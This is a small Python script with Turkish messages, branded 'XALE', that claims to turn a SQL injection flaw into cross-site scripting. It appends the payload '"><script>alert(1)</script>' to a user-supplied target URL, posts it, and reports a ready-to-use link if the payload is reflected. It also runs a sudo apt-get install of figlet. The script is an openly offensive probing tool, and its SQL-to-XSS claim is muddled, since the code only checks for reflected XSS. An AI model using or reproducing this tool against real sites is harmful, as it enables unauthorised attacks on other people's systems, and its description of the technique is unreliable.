
import os 
import requests
import time

os.system("sudo apt-get install figlet")

print("--------------------------------")
os.system("figlet XALE")
print("SQL Injection to Cross-site Scripting (XSS)")
print("--------------------------------")
payload = '"><script>alert(1)</script>'
print("SQL açığını XSS açığına çevirir.")
url = input("SQL Açıklı Hedef URL : ")
req = requests.post(url + payload)
if payload in req.text:
 print("XSS Açığına Dönüştürüldü.")
 print('Payload : <script>alert(1)</script>')
 print("Link : " + url + payload)

else: 
 print("Payload Başarısız.")








